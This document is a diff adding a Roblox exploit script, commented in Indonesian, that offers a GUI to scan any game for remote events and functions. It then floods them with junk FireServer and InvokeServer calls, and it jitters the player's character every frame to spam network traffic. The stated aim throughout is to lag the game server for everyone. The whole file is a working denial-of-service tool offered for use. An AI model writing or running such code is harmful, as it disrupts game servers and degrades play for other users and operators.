@@ -1,0 +1,128 @@
+-- [[ UNIVERSAL REMOTE SCAVENGER & LAGGER ]]
+-- Mencari remote di game APAPUN dan membanjirinya.
+
+local Players = game:GetService("Players")
+local ReplicatedStorage = game:GetService("ReplicatedStorage")
+local RunService = game:GetService("RunService")
+
+-- 1. SETUP UI
+local ScreenGui = Instance.new("ScreenGui")
+if gethui then ScreenGui.Parent = gethui() else ScreenGui.Parent = game:GetService("CoreGui") end
+
+local Frame = Instance.new("Frame")
+Frame.Parent = ScreenGui
+Frame.Size = UDim2.new(0, 220, 0, 160)
+Frame.Position = UDim2.new(0.5, -110, 0.3, 0)
+Frame.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
+Frame.Active = true; Frame.Draggable = true
+local Corner = Instance.new("UICorner"); Corner.Parent = Frame
+
+local Title = Instance.new("TextLabel")
+Title.Parent = Frame
+Title.Size = UDim2.new(1, 0, 0, 30)
+Title.Text = "💀 BLIND LAGGER"
+Title.TextColor3 = Color3.fromRGB(255, 0, 0)
+Title.Font = Enum.Font.GothamBlack
+
+local CountLbl = Instance.new("TextLabel")
+CountLbl.Parent = Frame
+CountLbl.Size = UDim2.new(1, 0, 0, 20)
+CountLbl.Position = UDim2.new(0, 0, 0.25, 0)
+CountLbl.Text = "Scanning Remotes..."
+CountLbl.TextColor3 = Color3.new(1, 1, 0)
+
+local ScanBtn = Instance.new("TextButton")
+ScanBtn.Parent = Frame
+ScanBtn.Size = UDim2.new(0.9, 0, 0, 40)
+ScanBtn.Position = UDim2.new(0.05, 0, 0.45, 0)
+ScanBtn.Text = "🔍 SCAN REMOTE BARU"
+ScanBtn.BackgroundColor3 = Color3.fromRGB(0, 100, 200)
+ScanBtn.TextColor3 = Color3.new(1,1,1)
+
+local LagBtn = Instance.new("TextButton")
+LagBtn.Parent = Frame
+LagBtn.Size = UDim2.new(0.9, 0, 0, 40)
+LagBtn.Position = UDim2.new(0.05, 0, 0.75, 0)
+LagBtn.Text = "START LAG: OFF"
+LagBtn.BackgroundColor3 = Color3.fromRGB(50, 50, 50)
+LagBtn.TextColor3 = Color3.new(1,1,1)
+
+-- 2. LOGIKA SCANNING
+local FoundRemotes = {}
+
+local function ScanRemotes()
+    FoundRemotes = {} -- Reset
+    CountLbl.Text = "Scanning..."
+    
+    local function Check(parent)
+        for _, v in pairs(parent:GetDescendants()) do
+            if v:IsA("RemoteEvent") or v:IsA("RemoteFunction") then
+                -- Filter remote bawaan Roblox (biasanya aman)
+                local name = v.Name:lower()
+                if not name:find("default") and not name:find("roblox") then
+                    table.insert(FoundRemotes, v)
+                end
+            end
+        end
+    end
+    
+    -- Scan tempat umum developer naruh remote
+    Check(ReplicatedStorage)
+    Check(game.Workspace)
+    Check(Players.LocalPlayer)
+    
+    CountLbl.Text = "Ditemukan: " .. #FoundRemotes .. " Remote!"
+    ScanBtn.Text = "🔍 RESCAN"
+    ScanBtn.BackgroundColor3 = Color3.fromRGB(0, 150, 0)
+end
+
+ScanBtn.MouseButton1Click:Connect(ScanRemotes)
+
+-- 3. LOGIKA LAG (FLOODING)
+local Lagging = false
+
+LagBtn.MouseButton1Click:Connect(function()
+    Lagging = not Lagging
+    if Lagging then
+        if #FoundRemotes == 0 then
+            ScanRemotes() -- Scan dulu kalau belum
+        end
+        
+        LagBtn.Text = "LAGGING... (" .. #FoundRemotes .. ")"
+        LagBtn.BackgroundColor3 = Color3.fromRGB(200, 0, 0)
+        
+        task.spawn(function()
+            while Lagging do
+                for _, remote in pairs(FoundRemotes) do
+                    -- Kirim sampah data yang membingungkan server
+                    -- Kita kirim String panjang dan Tabel kosong
+                    if remote:IsA("RemoteEvent") then
+                        pcall(function() remote:FireServer("LAG_TEST", {}) end)
+                    elseif remote:IsA("RemoteFunction") then
+                        task.spawn(function()
+                            pcall(function() remote:InvokeServer("LAG_TEST") end)
+                        end)
+                    end
+                end
+                task.wait(0.05) -- Jangan terlalu cepat biar HP kamu gak mati duluan
+            end
+        end)
+        
+        -- TAMBAHAN: PACKET SPAM (Gerakan Karakter)
+        -- Ini universal, tidak butuh remote
+        task.spawn(function()
+            local root = Players.LocalPlayer.Character and Players.LocalPlayer.Character:FindFirstChild("HumanoidRootPart")
+            while Lagging and root do
+                -- Teleport bolak-balik super cepat untuk membanjiri jaringan
+                root.CFrame = root.CFrame * CFrame.new(0.5, 0, 0)
+                RunService.Heartbeat:Wait()
+                root.CFrame = root.CFrame * CFrame.new(-0.5, 0, 0)
+                RunService.Heartbeat:Wait()
+            end
+        end)
+        
+    else
+        LagBtn.Text = "START LAG: OFF"
+        LagBtn.BackgroundColor3 = Color3.fromRGB(50, 50, 50)
+    end
+end)
